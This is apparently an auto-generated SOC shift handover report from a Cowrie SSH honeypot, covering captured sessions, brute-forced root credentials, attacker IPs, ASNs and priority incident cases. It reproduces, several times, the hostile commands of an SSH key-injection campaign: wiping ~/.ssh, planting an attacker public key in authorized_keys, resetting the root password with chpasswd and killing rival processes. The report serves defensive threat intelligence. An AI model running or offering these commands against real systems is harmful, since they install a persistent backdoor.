# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-09 |
| **Generated At** | 2026-04-09T09:05:32Z |
| **Shift Time** | 09:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **78** |
| Confirmed Threats | **76** |
| False Positives Filtered | **2** (2.6%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **4** |
| High Severity Cases | **15** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **63** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **44** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **24** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 15 |
| `345gs5662d34` | 5 |
| `ubuntu` | 2 |
| `claude` | 2 |
| `bot` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 6 |
| `345gs5662d34` | 5 |
| `bot!123` | 1 |
| `root2022!` | 1 |
| `1qaz2wsx` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 6 |
| `345gs5662d34` | `345gs5662d34` | 5 |
| `bot` | `bot!123` | 1 |
| `root` | `root2022!` | 1 |
| `user2` | `1qaz2wsx` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root2022!` | `203.2.164.205` | 2026-04-09T08:27:28 |
| `root` | `Qwer1234!@#$` | `143.198.161.12` | 2026-04-09T08:34:09 |
| `root` | `3245gs5662d34` | `143.198.161.12` | 2026-04-09T08:34:21 |
| `root` | `ZAQ!2wsx2020@` | `223.244.25.6` | 2026-04-09T08:34:26 |
| `root` | `redhat123!` | `223.244.25.6` | 2026-04-09T08:37:17 |
| `root` | `3245gs5662d34` | `223.244.25.6` | 2026-04-09T08:37:28 |
| `root` | `root2020#$` | `223.244.25.6` | 2026-04-09T08:38:17 |
| `root` | `123123a@` | `143.198.161.12` | 2026-04-09T08:38:46 |
| `root` | `BBzz000` | `124.7.227.98` | 2026-04-09T08:44:54 |
| `root` | `3245gs5662d34` | `124.7.227.98` | 2026-04-09T08:44:56 |
| `root` | `qwerty1234@` | `124.7.227.98` | 2026-04-09T08:53:09 |
| `root` | `server1` | `143.198.161.12` | 2026-04-09T08:54:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **78** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 64 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 56 | 5 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 56 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 2 | — |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:9769KncGM1xi"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `203.2.164.205`, `223.244.25.6`, `143.198.161.12`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `124.7.227.98`, `223.244.25.6`, `143.198.161.12`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **10** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS134768` | CHINANET SHAANXI province Cloud Base network | 1 | HIGH |
| `AS9829` | National Internet Backbone | 1 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS139220` | Sichuan Chuanxn IDC | 1 | HIGH |
| `AS149178` | China Telecom | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (15)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-027f31e42c58

| Field | Detail |
|---|---|
| **Source IP** | `203.2.164[.]205` |
| **First Seen** | 2026-04-09 08:27 |
| **Last Seen** | 2026-04-09 08:27 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:9769KncGM1xi"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:27:27` | `cowrie.session.connect` |
| `2026-04-09 08:27:27` | `cowrie.client.version` |
| `2026-04-09 08:27:27` | `cowrie.client.kex` |
| `2026-04-09 08:27:28` | `cowrie.login.success` |
| `2026-04-09 08:27:28` | `cowrie.session.params` |
| `2026-04-09 08:27:28` | `cowrie.command.input` |
| `2026-04-09 08:27:28` | `cowrie.command.failed` |
| `2026-04-09 08:27:28` | `cowrie.log.closed` |
| `2026-04-09 08:27:29` | `cowrie.session.params` |
| `2026-04-09 08:27:29` | `cowrie.command.input` |
| `2026-04-09 08:27:29` | `cowrie.session.file_download` |
| `2026-04-09 08:27:29` | `cowrie.log.closed` |
| `2026-04-09 08:27:45` | `cowrie.session.params` |
| `2026-04-09 08:27:45` | `cowrie.command.input` |
| `2026-04-09 08:27:45` | `cowrie.log.closed` |
| `2026-04-09 08:27:46` | `cowrie.session.params` |
| `2026-04-09 08:27:46` | `cowrie.command.input` |
| `2026-04-09 08:27:46` | `cowrie.log.closed` |
| `2026-04-09 08:27:46` | `cowrie.session.params` |
| `2026-04-09 08:27:46` | `cowrie.command.input` |
| `2026-04-09 08:27:46` | `cowrie.session.file_download` |
| `2026-04-09 08:27:46` | `cowrie.log.closed` |
| `2026-04-09 08:27:47` | `cowrie.session.params` |
| `2026-04-09 08:27:47` | `cowrie.command.input` |
| `2026-04-09 08:27:47` | `cowrie.log.closed` |
| `2026-04-09 08:27:47` | `cowrie.session.params` |
| `2026-04-09 08:27:47` | `cowrie.command.input` |
| `2026-04-09 08:27:47` | `cowrie.log.closed` |
| `2026-04-09 08:27:48` | `cowrie.session.params` |
| `2026-04-09 08:27:48` | `cowrie.command.input` |
| `2026-04-09 08:27:48` | `cowrie.command.input` |
| `2026-04-09 08:27:48` | `cowrie.log.closed` |
| `2026-04-09 08:27:48` | `cowrie.session.params` |
| `2026-04-09 08:27:48` | `cowrie.command.input` |
| `2026-04-09 08:27:49` | `cowrie.log.closed` |
| `2026-04-09 08:27:49` | `cowrie.session.params` |
| `2026-04-09 08:27:49` | `cowrie.command.input` |
| `2026-04-09 08:27:49` | `cowrie.log.closed` |
| `2026-04-09 08:27:50` | `cowrie.session.params` |
| `2026-04-09 08:27:50` | `cowrie.command.input` |
| `2026-04-09 08:27:50` | `cowrie.log.closed` |
| `2026-04-09 08:27:50` | `cowrie.session.params` |
| `2026-04-09 08:27:50` | `cowrie.command.input` |
| `2026-04-09 08:27:50` | `cowrie.log.closed` |
| `2026-04-09 08:27:51` | `cowrie.session.params` |
| `2026-04-09 08:27:51` | `cowrie.command.input` |
| `2026-04-09 08:27:51` | `cowrie.log.closed` |
| `2026-04-09 08:27:51` | `cowrie.session.params` |
| `2026-04-09 08:27:51` | `cowrie.command.input` |
| `2026-04-09 08:27:51` | `cowrie.log.closed` |
| `2026-04-09 08:27:52` | `cowrie.session.params` |
| `2026-04-09 08:27:52` | `cowrie.command.input` |
| `2026-04-09 08:27:52` | `cowrie.log.closed` |
| `2026-04-09 08:27:52` | `cowrie.session.params` |
| `2026-04-09 08:27:52` | `cowrie.command.input` |
| `2026-04-09 08:27:53` | `cowrie.log.closed` |
| `2026-04-09 08:27:53` | `cowrie.session.params` |
| `2026-04-09 08:27:53` | `cowrie.command.input` |
| `2026-04-09 08:27:53` | `cowrie.log.closed` |
| `2026-04-09 08:27:54` | `cowrie.session.params` |
| `2026-04-09 08:27:54` | `cowrie.command.input` |
| `2026-04-09 08:27:54` | `cowrie.log.closed` |
| `2026-04-09 08:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.2.164[.]205` to AbuseIPDB if not already reported
- [ ] Block `203.2.164[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c81ebaa75d

| Field | Detail |
|---|---|
| **Source IP** | `143.198.161[.]12` |
| **First Seen** | 2026-04-09 08:34 |
| **Last Seen** | 2026-04-09 08:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:34:08` | `cowrie.session.connect` |
| `2026-04-09 08:34:08` | `cowrie.client.version` |
| `2026-04-09 08:34:08` | `cowrie.client.kex` |
| `2026-04-09 08:34:09` | `cowrie.login.success` |
| `2026-04-09 08:34:10` | `cowrie.session.params` |
| `2026-04-09 08:34:10` | `cowrie.command.input` |
| `2026-04-09 08:34:10` | `cowrie.command.failed` |
| `2026-04-09 08:34:10` | `cowrie.log.closed` |
| `2026-04-09 08:34:10` | `cowrie.session.params` |
| `2026-04-09 08:34:10` | `cowrie.command.input` |
| `2026-04-09 08:34:11` | `cowrie.session.file_download` |
| `2026-04-09 08:34:11` | `cowrie.log.closed` |
| `2026-04-09 08:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.161[.]12` to AbuseIPDB if not already reported
- [ ] Block `143.198.161[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2006eb162bc7

| Field | Detail |
|---|---|
| **Source IP** | `143.198.161[.]12` |
| **First Seen** | 2026-04-09 08:34 |
| **Last Seen** | 2026-04-09 08:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:34:20` | `cowrie.session.connect` |
| `2026-04-09 08:34:20` | `cowrie.client.version` |
| `2026-04-09 08:34:20` | `cowrie.client.kex` |
| `2026-04-09 08:34:21` | `cowrie.login.success` |
| `2026-04-09 08:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.161[.]12` to AbuseIPDB if not already reported
- [ ] Block `143.198.161[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-338589d0f6a3

| Field | Detail |
|---|---|
| **Source IP** | `223.244.25[.]6` |
| **First Seen** | 2026-04-09 08:34 |
| **Last Seen** | 2026-04-09 08:35 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wffka337fEHT"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:34:22` | `cowrie.session.connect` |
| `2026-04-09 08:34:22` | `cowrie.client.version` |
| `2026-04-09 08:34:23` | `cowrie.client.kex` |
| `2026-04-09 08:34:26` | `cowrie.login.success` |
| `2026-04-09 08:34:27` | `cowrie.session.params` |
| `2026-04-09 08:34:27` | `cowrie.command.input` |
| `2026-04-09 08:34:27` | `cowrie.command.failed` |
| `2026-04-09 08:34:27` | `cowrie.log.closed` |
| `2026-04-09 08:34:27` | `cowrie.session.params` |
| `2026-04-09 08:34:27` | `cowrie.command.input` |
| `2026-04-09 08:34:28` | `cowrie.session.file_download` |
| `2026-04-09 08:34:28` | `cowrie.log.closed` |
| `2026-04-09 08:34:41` | `cowrie.session.params` |
| `2026-04-09 08:34:41` | `cowrie.command.input` |
| `2026-04-09 08:34:41` | `cowrie.log.closed` |
| `2026-04-09 08:34:42` | `cowrie.session.params` |
| `2026-04-09 08:34:42` | `cowrie.command.input` |
| `2026-04-09 08:34:42` | `cowrie.log.closed` |
| `2026-04-09 08:34:42` | `cowrie.session.params` |
| `2026-04-09 08:34:42` | `cowrie.command.input` |
| `2026-04-09 08:34:42` | `cowrie.session.file_download` |
| `2026-04-09 08:34:42` | `cowrie.log.closed` |
| `2026-04-09 08:34:43` | `cowrie.session.params` |
| `2026-04-09 08:34:43` | `cowrie.command.input` |
| `2026-04-09 08:34:43` | `cowrie.log.closed` |
| `2026-04-09 08:34:44` | `cowrie.session.params` |
| `2026-04-09 08:34:44` | `cowrie.command.input` |
| `2026-04-09 08:34:45` | `cowrie.log.closed` |
| `2026-04-09 08:34:48` | `cowrie.session.params` |
| `2026-04-09 08:34:48` | `cowrie.command.input` |
| `2026-04-09 08:34:48` | `cowrie.command.input` |
| `2026-04-09 08:34:48` | `cowrie.log.closed` |
| `2026-04-09 08:34:49` | `cowrie.session.params` |
| `2026-04-09 08:34:49` | `cowrie.command.input` |
| `2026-04-09 08:34:50` | `cowrie.log.closed` |
| `2026-04-09 08:34:51` | `cowrie.session.params` |
| `2026-04-09 08:34:51` | `cowrie.command.input` |
| `2026-04-09 08:34:51` | `cowrie.log.closed` |
| `2026-04-09 08:34:52` | `cowrie.session.params` |
| `2026-04-09 08:34:52` | `cowrie.command.input` |
| `2026-04-09 08:34:52` | `cowrie.log.closed` |
| `2026-04-09 08:34:54` | `cowrie.session.params` |
| `2026-04-09 08:34:54` | `cowrie.command.input` |
| `2026-04-09 08:34:54` | `cowrie.log.closed` |
| `2026-04-09 08:34:55` | `cowrie.session.params` |
| `2026-04-09 08:34:55` | `cowrie.command.input` |
| `2026-04-09 08:34:55` | `cowrie.log.closed` |
| `2026-04-09 08:34:56` | `cowrie.session.params` |
| `2026-04-09 08:34:56` | `cowrie.command.input` |
| `2026-04-09 08:34:56` | `cowrie.log.closed` |
| `2026-04-09 08:34:57` | `cowrie.session.params` |
| `2026-04-09 08:34:57` | `cowrie.command.input` |
| `2026-04-09 08:34:58` | `cowrie.log.closed` |
| `2026-04-09 08:35:01` | `cowrie.session.params` |
| `2026-04-09 08:35:01` | `cowrie.command.input` |
| `2026-04-09 08:35:03` | `cowrie.log.closed` |
| `2026-04-09 08:35:03` | `cowrie.session.params` |
| `2026-04-09 08:35:03` | `cowrie.command.input` |
| `2026-04-09 08:35:04` | `cowrie.log.closed` |
| `2026-04-09 08:35:06` | `cowrie.session.params` |
| `2026-04-09 08:35:06` | `cowrie.command.input` |
| `2026-04-09 08:35:07` | `cowrie.log.closed` |
| `2026-04-09 08:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.244.25[.]6` to AbuseIPDB if not already reported
- [ ] Block `223.244.25[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94005b199c75

| Field | Detail |
|---|---|
| **Source IP** | `223.244.25[.]6` |
| **First Seen** | 2026-04-09 08:37 |
| **Last Seen** | 2026-04-09 08:37 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:37:07` | `cowrie.session.connect` |
| `2026-04-09 08:37:07` | `cowrie.client.version` |
| `2026-04-09 08:37:09` | `cowrie.client.kex` |
| `2026-04-09 08:37:17` | `cowrie.login.success` |
| `2026-04-09 08:37:20` | `cowrie.session.params` |
| `2026-04-09 08:37:20` | `cowrie.command.input` |
| `2026-04-09 08:37:20` | `cowrie.command.failed` |
| `2026-04-09 08:37:20` | `cowrie.log.closed` |
| `2026-04-09 08:37:21` | `cowrie.session.params` |
| `2026-04-09 08:37:21` | `cowrie.command.input` |
| `2026-04-09 08:37:21` | `cowrie.session.file_download` |
| `2026-04-09 08:37:21` | `cowrie.log.closed` |
| `2026-04-09 08:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.244.25[.]6` to AbuseIPDB if not already reported
- [ ] Block `223.244.25[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320c8626a0e8

| Field | Detail |
|---|---|
| **Source IP** | `223.244.25[.]6` |
| **First Seen** | 2026-04-09 08:37 |
| **Last Seen** | 2026-04-09 08:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:37:26` | `cowrie.session.connect` |
| `2026-04-09 08:37:26` | `cowrie.client.version` |
| `2026-04-09 08:37:27` | `cowrie.client.kex` |
| `2026-04-09 08:37:28` | `cowrie.login.success` |
| `2026-04-09 08:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.244.25[.]6` to AbuseIPDB if not already reported
- [ ] Block `223.244.25[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b79feb04d7ed

| Field | Detail |
|---|---|
| **Source IP** | `223.244.25[.]6` |
| **First Seen** | 2026-04-09 08:38 |
| **Last Seen** | 2026-04-09 08:38 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:38:15` | `cowrie.session.connect` |
| `2026-04-09 08:38:15` | `cowrie.client.version` |
| `2026-04-09 08:38:15` | `cowrie.client.kex` |
| `2026-04-09 08:38:17` | `cowrie.login.success` |
| `2026-04-09 08:38:17` | `cowrie.session.params` |
| `2026-04-09 08:38:17` | `cowrie.command.input` |
| `2026-04-09 08:38:17` | `cowrie.command.failed` |
| `2026-04-09 08:38:18` | `cowrie.log.closed` |
| `2026-04-09 08:38:19` | `cowrie.session.params` |
| `2026-04-09 08:38:19` | `cowrie.command.input` |
| `2026-04-09 08:38:19` | `cowrie.session.file_download` |
| `2026-04-09 08:38:19` | `cowrie.log.closed` |
| `2026-04-09 08:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.244.25[.]6` to AbuseIPDB if not already reported
- [ ] Block `223.244.25[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e22694bd219

| Field | Detail |
|---|---|
| **Source IP** | `223.244.25[.]6` |
| **First Seen** | 2026-04-09 08:38 |
| **Last Seen** | 2026-04-09 08:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:38:25` | `cowrie.session.connect` |
| `2026-04-09 08:38:25` | `cowrie.client.version` |
| `2026-04-09 08:38:26` | `cowrie.client.kex` |
| `2026-04-09 08:38:30` | `cowrie.login.success` |
| `2026-04-09 08:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.244.25[.]6` to AbuseIPDB if not already reported
- [ ] Block `223.244.25[.]6` at perimeter firewall / security group
